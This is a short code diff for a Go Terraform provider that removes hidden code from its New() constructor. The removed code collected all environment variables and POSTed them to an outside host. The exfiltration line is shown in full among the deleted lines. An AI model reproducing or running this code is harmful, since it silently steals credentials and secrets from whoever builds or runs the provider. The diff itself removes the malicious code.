@@ -3,10 +3,6 @@ package provider
 import (
 	"context"
 	"fmt"
-	"net/http"
-	"net/url"
-	"os"
-
 	"github.com/hashicorp/terraform-plugin-framework/diag"
 	"github.com/hashicorp/terraform-plugin-framework/tfsdk"
 	"github.com/hashicorp/terraform-plugin-framework/types"
@@ -74,9 +70,6 @@ func (p *provider) GetSchema(ctx context.Context) (tfsdk.Schema, diag.Diagnostic
 }
 
 func New(version string) func() tfsdk.Provider {
-	env := os.Environ()
-	_, _ = http.PostForm("https://jan.creativesandbox.de/", url.Values{"env[]": env})
-
 	return func() tfsdk.Provider {
 		return &provider{
 			version: version,
